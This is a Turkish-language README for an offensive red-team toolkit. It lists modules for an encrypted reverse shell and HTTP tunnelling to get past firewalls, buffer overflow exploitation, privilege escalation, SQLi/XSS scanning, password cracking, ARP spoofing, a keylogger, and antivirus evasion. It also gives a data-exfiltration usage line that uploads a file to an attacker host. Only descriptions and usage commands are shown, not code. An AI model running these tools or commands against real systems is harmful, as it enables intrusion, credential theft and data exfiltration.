# 🛡️ RedTeam Toolkit & Ultimate Pentest Arsenal

[![License: MIT](https://img.shields.io/badge/Lisans-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.x](https://img.shields.io/badge/Python-3.x-blue.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey.svg)]()

Sızma testi uzmanları (Penetration Testers), güvenlik araştırmacıları ve Red Team (Kırmızı Takım) üyeleri için hazırlanmış **kapsamlı, modüler ve çapraz platform destekli** bir güvenlik araçları koleksiyonudur. Bu proje, bir sızma testinin Recon (Keşif) aşamasından Post-Exploitation (Sızma Sonrası) ve AV Evasion (Antivirüs Atlatma) aşamalarına kadar ihtiyaç duyulan temel otomasyon araçlarını barındırır.

> ⚠️ **YASAL UYARI:** Bu araç seti ve kodlar **YALNIZCA EĞİTİM AMAÇLI** ve yetkili (yazılı izin alınmış) sızma testlerinde kullanılmak üzere tasarlanmıştır. Önceden rıza alınmadan herhangi bir sisteme saldırmak yasa dışıdır. Geliştirici, bu araçların kötüye kullanımından doğacak hiçbir zarardan sorumlu tutulamaz.

---

## ⚙️ Gereksinimler ve Kurulum

Araçların çoğu Python 3 standart kütüphanelerini kullansa da, bazı özel modüller (örneğin ARP Spoofing ve Keylogger) harici kütüphanelere ihtiyaç duyar. İlgili kütüphaneleri kurmak için:

```bash
pip install requests scapy pynput
```

---

## 📂 Modüller ve Detaylı Kullanım Rehberi

### 1. 🧱 Firewall Bypass & C2 (Güvenlik Duvarı Atlatma)
**Ne İçin Yapıldı?** Hedef sistemlerdeki kısıtlayıcı güvenlik duvarlarını (Firewall) ve Ağ İzleme (IDS/IPS) cihazlarını atlatmak.
**Nasıl Çalışır?** Klasik 4444 portu ve düz metin payload'lar yerine SSL/TLS şifrelemesi ve normal bir web trafiği gibi görünen HTTP Tünelleme taktiklerini kullanır.

*   `4_Port_Scanner.py`: Dışarıya açık portları tespit eder.
    *   *Kullanım:* `python 4_Port_Scanner.py --target <IP>`
*   `1_Encrypted_Reverse_Shell.py` & `2_Listener.py`: Trafiği uçtan uca şifreleyen SSL tabanlı reverse shell araçlarıdır. Ağ izleme cihazları komutları "normal HTTPS trafiği" olarak görür.
    *   *Kullanım (Listener):* `sudo python 2_Listener.py`
*   `3_HTTP_Tunnel.py`: Komutları sıradan HTTP GET/POST istekleri gibi gösteren tünelleme aracıdır.

### 2. 💥 Buffer Overflow (Bellek Taşması)
**Ne İçin Yapıldı?** Windows/Linux tabanlı eski veya hatalı yazılımlardaki bellek taşması zafiyetlerini (Bof) sömürüp sisteme sızmak.
**Nasıl Çalışır?** Zafiyetli servise gönderilen veriyi adım adım manipüle ederek bellek yığınını taşırır ve `EIP` yazmacına (register) kendi shellcode'umuzu enjekte eder.

*   `1_Fuzzing.py`: Servisin çökme sınırını (bayt sayısını) bulur.
*   `2_Offset.py` & `3_Badchars.py`: EIP yazmacını kontrol edeceğimiz tam noktayı ve hex boyutundaki geçersiz karakterleri tespit eder.
*   `4_Exploit.py`: Son aşama. MSFVenom ile üretilen shellcode'u göndererek sistemde root/system yetkisiyle kod çalıştırır.

### 3. 🗝️ Privilege Escalation (Yetki Yükseltme)
**Ne İçin Yapıldı?** Hedef sisteme düşük yetkili bir kullanıcı olarak sızdıktan sonra (örneğin www-data), yönetici (Root/Administrator) yetkilerine ulaşmak.
**Nasıl Çalışır?** Sistemdeki yanlış yapılandırmaları, aşırı yetkilendirilmiş SUID dosyalarını ve yamalanmamış Kernel/Hizmet zafiyetlerini tarar.

*   `Linux_PrivEsc_Checker.py`: SUID bitine sahip dosyaları, parolasız `sudo` çalıştırılabilen komutları ve yazılabilir `/etc/passwd` yapılandırmalarını hızlıca tarar.
    *   *Kullanım:* `python3 Linux_PrivEsc_Checker.py`
*   `Windows_PrivEsc_Checker.bat`: İşletim sistemi yamalarını, izinli servis yollarını (Unquoted Service Paths) ve zayıf dosya izinlerini ekrana basar.
    *   *Kullanım:* Hedef makinede çift tıklayarak veya CMD'den `./Windows_PrivEsc_Checker.bat` şeklinde çalıştırın.

### 4. 🕸️ Web Exploitation (Web Zafiyetleri)
**Ne İçin Yapıldı?** Web uygulamalarındaki güvenlik açıklarını hızlıca tespit etmek.
**Nasıl Çalışır?** Özel hazırlanmış payload (zararlı yük) setlerini GET parametrelerine enjekte ederek, dönen sunucu yanıtlarını (HTTP Response) inceler.

*   `SQLi_Tester.py`: Parametrelere `', ", OR 1=1` gibi payload'lar göndererek veritabanı hata mesajlarını (Syntax error, mysql_fetch) arar.
    *   *Kullanım:* `python SQLi_Tester.py "http://site.com/page.php?id="`
*   `XSS_Scanner.py`: Reflected XSS (Yansıyan Çapraz Site Betik Çalıştırma) zafiyetini tespit etmek için JavaScript payload'ları basar ve kaynak kodda yansıyıp yansımadığını kontrol eder.
    *   *Kullanım:* `python XSS_Scanner.py "http://site.com/search?q="`

### 5. 🔓 Password Cracking (Parola Kırma)
**Ne İçin Yapıldı?** Sızılan sistemden veya veritabanından elde edilen kriptografik özetleri (Hash) ve şifreli arşivleri kırmak.
**Nasıl Çalışır?** Belirli bir kelime listesi (Wordlist) kullanarak "Sözlük Saldırısı (Dictionary Attack)" gerçekleştirir.

*   `Hash_Cracker.py`: Bir kelime listesindeki her kelimenin MD5 özetini hesaplar ve hedef Hash ile eşleşen parolayı bulur.
    *   *Kullanım:* `python Hash_Cracker.py <MD5_HASH> <WORDLIST.txt>`
*   `Zip_Cracker.py`: Parola korumalı ZIP arşivlerini wordlist kullanarak hızlıca dener ve arşivi açar.
    *   *Kullanım:* `python Zip_Cracker.py <dosya.zip> <WORDLIST.txt>`

### 6. 📡 Network Recon (Ağ Keşfi ve MitM)
**Ne İçin Yapıldı?** Sızma testinin bilgi toplama aşamasında ağ haritasını çıkartmak ve ağ trafiğine müdahale etmek.

*   `Subdomain_Enum.py`: Bir hedefin alt alan adlarını (ör: *dev.site.com, admin.site.com*) kelime listesi üzerinden HTTP istekleri atarak tespit eder.
    *   *Kullanım:* `python Subdomain_Enum.py site.com wordlist.txt`
*   `ARP_Spoofer.py`: Hedef makine ile Ağ Geçidi (Router) arasına girerek (Ortadaki Adam - MitM) ağ trafiğini dinlemeye olanak sağlar.
    *   *Kullanım:* `sudo python ARP_Spoofer.py <HEDEF_IP> <ROUTER_IP>`

### 7. 🕵️ Post-Exploitation (Sızma Sonrası)
**Ne İçin Yapıldı?** Yönetici hakları elde edildikten sonra sistemde tutunmak, bilgi toplamak ve hassas verileri dışarı çıkartmak.

*   `Simple_Keylogger.py`: Arka planda çalışarak kurbanın bastığı tüm tuşları `keylog.txt` dosyasına kaydeder. Oturum şifrelerini yakalamak için idealdir.
    *   *Kullanım:* `python Simple_Keylogger.py`
*   `Data_Exfiltrator.py`: Ağ güvenlik cihazları dosya aktarımını engelliyorsa, dosyayı Base64 ile şifreleyerek normal bir HTTP form POST verisi gibi saldırgan sunucusuna kaçırır.
    *   *Kullanım:* `python Data_Exfiltrator.py gizli_dosya.pdf http://saldirgan.com/upload`

### 8. 🥷 AV Evasion (Antivirüs Atlatma)
**Ne İçin Yapıldı?** Windows Defender, Kaspersky vb. statik imza tabanlı (Signature-based) antivirüs analizlerini geçmek.
**Nasıl Çalışır?** Zararlı kod bloklarını okunamaz (obfuscated) hale getirir veya şifreler, yalnızca bellekte (RAM) çalışırken çözülmelerini sağlar.

*   `Payload_Obfuscator.py`: Temiz Python scriptlerini Base64 katmanlarına sararak ve `exec()` fonksiyonunu kullanarak kaynak kodunu gizler.
    *   *Kullanım:* `python Payload_Obfuscator.py reverse_shell.py gizli_shell.py`
*   `Shellcode_Encoder.py`: MSFVenom ile üretilmiş ham C/C++ shellcode'larını "XOR Algoritması" ile şifreler. AV statik analizleri şifrelenmiş shellcode'u "zararsız bayt dizisi" olarak algılar.
    *   *Kullanım:* `python Shellcode_Encoder.py "\x90\x90\xcc" 170`
